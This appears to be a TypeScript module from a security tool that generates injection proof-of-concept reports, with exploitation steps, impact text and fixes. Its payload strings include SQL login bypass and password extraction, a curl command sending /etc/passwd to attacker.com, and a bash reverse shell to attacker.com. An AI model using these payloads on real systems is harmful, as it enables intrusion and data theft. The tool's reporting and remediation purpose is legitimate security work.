import { ProofOfConcept, ExploitationStep, Payload } from '../types';
import { PocGenerator } from '../PocGenerator';
import { CodeFlowVisualizer } from '../CodeFlowVisualizer';
import { PocGenerationRequest, PocGenerationResult } from '../types';

/**
 * SQL Injection / Input Validation POC Generator
 *
 * Generates detailed Proof-of-Concept for SQL injection, NoSQL injection,
 * command injection, and other input validation bypass vulnerabilities.
 */
export class InjectionPocGenerator extends PocGenerator {
  /**
   * Generate POC for injection vulnerability
   */
  generate(request: PocGenerationRequest): PocGenerationResult {
    const startTime = Date.now();

    try {
      const injectionType = this.identifyInjectionType(request.vulnerableCode);
      const poc = this.createBasePoc(
        `injection-${request.location.line}`,
        `${injectionType} Injection in ${request.location.file}`,
        injectionType,
        'CRITICAL',
        request
      );

      // Build exploitation steps
      poc.steps = this.buildExploitationSteps(request, injectionType);

      // Build code flow
      poc.codeFlow = this.buildCodeFlow(request, injectionType);

      // Description
      poc.description = this.buildDescription(injectionType);

      // Root cause
      poc.rootCause = `User-supplied input is directly concatenated into a ${injectionType} query without proper parameterization or sanitization. 
This allows attackers to inject malicious syntax that is interpreted as code rather than data.`;

      // Impacts
      poc.businessImpact = this.getBusinessImpact(injectionType);
      poc.technicalImpact = this.getTechnicalImpact(injectionType);

      // Payloads
      poc.payloads = this.buildPayloads(injectionType);

      // Remediation
      poc.remediationDescription = `Use parameterized queries (prepared statements) to separate SQL code from data. 
This ensures user input is treated as data regardless of special characters or SQL syntax.`;
      poc.remediationCode = this.getRemediationCode(injectionType);

      // Preconditions
      poc.preconditions = [
        'Attacker can supply input to the vulnerable parameter',
        'Input is not properly validated or sanitized',
        'Input is concatenated directly into a query string',
        'Attacker has network access to the application endpoint',
      ];

      poc.owaspCategory = 'A03:2021 – Injection';
      poc.cvssScore = 9.9;

      return {
        success: true,
        poc,
        duration: Date.now() - startTime,
      };
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : String(error);
      return {
        success: false,
        error: `Failed to generate injection POC: ${errorMessage}`,
        duration: Date.now() - startTime,
      };
    }
  }

  /**
   * Identify injection type
   */
  private identifyInjectionType(code: string): string {
    if (/query|SELECT|INSERT|UPDATE|DELETE|sql/i.test(code)) {
      return 'SQL Injection';
    } else if (/find\(|find\[|\.where|db\./i.test(code)) {
      return 'NoSQL Injection';
    } else if (/exec|spawn|child_process|system|shell/i.test(code)) {
      return 'Command Injection';
    } else if (/eval|Function|new Function/i.test(code)) {
      return 'Code Injection';
    } else if (/Template|render|jade|ejs/i.test(code)) {
      return 'Template Injection';
    }
    return 'Input Injection';
  }

  /**
   * Build exploitation steps
   */
  private buildExploitationSteps(request: PocGenerationRequest, injectionType: string): ExploitationStep[] {
    const steps: ExploitationStep[] = [];

    // Step 1: Discover injection point
    steps.push(
      this.createStep(1, 'Discover Injection Point', 'attacker', {
        actionType: 'reconnaissance',
        notes: 'Identify a parameter that accepts user input and is used in a query',
        expectedResult: 'Found vulnerable endpoint that accepts user input',
      })
    );

    // Step 2: Test for vulnerability
    steps.push(
      this.createStep(2, 'Test for Vulnerability', 'attacker', {
        actionType: 'reconnaissance',
        payload: `${injectionType === 'SQL Injection' ? "' OR '1'='1" : injectionType === 'Command Injection' ? '; ls -la' : "'; alert('xss'); //"}`,
        notes: `Send special characters to trigger ${injectionType}`,
        expectedResult: 'Abnormal response or error message confirming vulnerability',
      })
    );

    // Step 3: Craft malicious payload
    steps.push(
      this.createStep(3, 'Craft Exploitation Payload', 'attacker', {
        actionType: 'payload-creation',
        payload: this.craftPayload(injectionType),
        notes: 'Design payload to execute unintended operations',
        expectedResult: 'Payload prepared and ready for execution',
      })
    );

    // Step 4: Execute injection
    steps.push(
      this.createStep(4, 'Send Injection Payload', 'attacker', {
        actionType: 'exploitation',
        codeSnippet: request.vulnerableCode,
        filePath: request.location.file,
        lineNumber: request.location.line,
        notes: 'Application concatenates payload directly into query',
        expectedResult: 'Unintended code executed on backend',
      })
    );

    // Step 5: Achieve objective
    steps.push(
      this.createStep(5, 'Achieve Exploitation Goal', 'attacker', {
        actionType: 'data-theft',
        notes: this.getExploitationObjective(injectionType),
        expectedResult: `${injectionType === 'SQL Injection' ? 'Complete database dumped' : injectionType === 'Command Injection' ? 'Remote command execution achieved' : 'Server-side code execution'}`,
      })
    );

    return steps;
  }

  /**
   * Build code flow
   */
  private buildCodeFlow(request: PocGenerationRequest, injectionType: string) {
    return CodeFlowVisualizer.generateFlowWithVariableTracking(
      request.vulnerableCode,
      request.location.file,
      request.location.line,
      'userInput',
      injectionType
    );
  }

  /**
   * Craft exploitation payload
   */
  private craftPayload(injectionType: string): string {
    const payloads: { [key: string]: string } = {
      'SQL Injection': `' UNION SELECT username, password, email, role FROM admin_users -- `,
      'NoSQL Injection': `{"$ne": null}`,
      'Command Injection': `; cat /etc/passwd | curl attacker.com/`,
      'Code Injection': `'); process.exit(); //`,
      'Template Injection': `{{7*7}} <%= 7*7 %>`,
      'Input Injection': `<img src=x onerror="alert('xss')">`,
    };
    return payloads[injectionType] || 'injection-payload';
  }

  /**
   * Build payloads
   */
  private buildPayloads(injectionType: string): Payload[] {
    const payloads: Payload[] = [];

    if (injectionType === 'SQL Injection') {
      payloads.push(
        this.createPayload(
          'Basic Authentication Bypass',
          `username=admin' OR '1'='1' --
password=anything`,
          'sql',
          'Bypass login using always-true condition',
          {
            difficulty: 'easy',
            successRate: 100,
            expectedOutput: 'Successful authentication without valid credentials',
          }
        ) as Payload,

        this.createPayload(
          'Extract User Data',
          `' UNION SELECT username, password, email FROM users --`,
          'sql',
          'Extract all user data from database',
          {
            difficulty: 'medium',
            successRate: 95,
            expectedOutput: 'Complete user database with passwords',
          }
        ) as Payload,

        this.createPayload(
          'Blind SQL Injection (Time-based)',
          `'; WAITFOR DELAY '00:00:05'; --`,
          'sql',
          'Exfiltrate data through timing side-channel',
          {
            difficulty: 'hard',
            successRate: 70,
            expectedOutput: 'Data extracted bit-by-bit through response timing',
          }
        ) as Payload
      );
    } else if (injectionType === 'Command Injection') {
      payloads.push(
        this.createPayload(
          'List Directory Contents',
          `; ls -la /home`,
          'bash',
          'Execute arbitrary system commands',
          {
            difficulty: 'easy',
            successRate: 100,
            expectedOutput: 'Directory listing showing files and permissions',
          }
        ) as Payload,

        this.createPayload(
          'Reverse Shell',
          `; bash -i >& /dev/tcp/attacker.com/4444 0>&1`,
          'bash',
          'Establish reverse shell for interactive access',
          {
            difficulty: 'medium',
            successRate: 90,
            expectedOutput: 'Interactive shell access to target system',
          }
        ) as Payload
      );
    } else {
      payloads.push(
        this.createPayload(
          'Injection Test Payload',
          this.craftPayload(injectionType),
          'text',
          `${injectionType} exploitation payload`,
          {
            difficulty: 'easy',
            successRate: 100,
          }
        ) as Payload
      );
    }

    return payloads;
  }

  /**
   * Get exploitation objective
   */
  private getExploitationObjective(injectionType: string): string {
    const objectives: { [key: string]: string } = {
      'SQL Injection': `
1. Extract sensitive data from database (users, payment info, secrets)
2. Modify or delete database records
3. Escalate database privileges
4. Read files from server filesystem
5. Execute operating system commands (in some databases)`,
      'Command Injection': `
1. Execute arbitrary operating system commands
2. Read sensitive files (/etc/passwd, config files)
3. Establish reverse shells for remote access
4. Modify system files and configurations
5. Deploy malware and backdoors`,
      'NoSQL Injection': `
1. Bypass authentication and authorization
2. Extract sensitive data from collections
3. Modify or delete database records
4. Escalate privileges
5. Execute arbitrary code (in some contexts)`,
      'Code Injection': `
1. Execute arbitrary code on the server
2. Read and modify application state
3. Access sensitive data in memory
4. Spawn new processes and run commands
5. Completely compromise the application`,
    };
    return objectives[injectionType] || 'Execute unintended operations';
  }

  /**
   * Build description
   */
  private buildDescription(injectionType: string): string {
    return `A ${injectionType} vulnerability has been identified in the application. 
User-supplied input is directly concatenated into queries or commands without proper validation or parameterization.

This vulnerability occurs when:
- User input is directly used in query construction
- No input validation is performed
- Special characters are not escaped
- Parameterized queries/prepared statements are not used
- Dynamic code execution occurs with user input`;
  }

  /**
   * Get business impact
   */
  private getBusinessImpact(injectionType: string): string {
    return `${injectionType} can result in:

**Immediate Threats:**
- Complete database breach and data exfiltration
- Unauthorized data modification or deletion
- Service disruption and system downtime
- Unauthorized access to sensitive systems
- Financial fraud and transaction manipulation

**Business Impact:**
- Loss of customer trust and reputation damage
- Regulatory compliance violations (GDPR, HIPAA, PCI-DSS)
- Significant financial losses and legal liability
- Mandatory breach notifications and notifications costs
- Business operations completely disrupted`;
  }

  /**
   * Get technical impact
   */
  private getTechnicalImpact(injectionType: string): string {
    return `Technical consequences of ${injectionType}:

**System Compromise:**
- Complete database access and manipulation
- Operating system command execution (in applicable contexts)
- File system access for reading and writing
- Memory and process manipulation
- Lateral movement to connected systems

**Data Exposure:**
- Complete customer and user data extraction
- Payment card and financial information theft
- Credentials and secrets exfiltration
- Intellectual property and trade secrets access
- Audit logs and forensic evidence destruction`;
  }

  /**
   * Get remediation code
   */
  private getRemediationCode(injectionType: string): string {
    if (injectionType === 'SQL Injection') {
      return `// ❌ VULNERABLE: String concatenation
const query = \`SELECT * FROM users WHERE id = \${userId}\`;
db.query(query);

// ✅ FIXED: Parameterized query (Node.js with mysql)
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId], (err, results) => {
  // Safe - userId is treated as data, not code
});

// ✅ FIXED: Using ORM (Sequelize)
const user = await User.findByPk(userId);

// ✅ FIXED: Using query builder (Knex)
const user = await knex('users').where('id', userId).first();`;
    } else if (injectionType === 'Command Injection') {
      return `// ❌ VULNERABLE: Child process with shell
const result = exec(\`ping -c 1 \${userInput}\`);

// ✅ FIXED: Use array form, no shell injection
const { execFile } = require('child_process');
execFile('ping', ['-c', '1', userInput], (err, stdout) => {
  // Safe - userInput is not interpreted as shell syntax
});

// ✅ FIXED: Input validation
const validHostname = /^[a-zA-Z0-9.-]+$/.test(userInput) ? userInput : null;
if (!validHostname) throw new Error('Invalid hostname');`;
    }

    return `// Use parameterized queries or prepared statements
// See the vulnerable code above for specific examples`;
  }
}
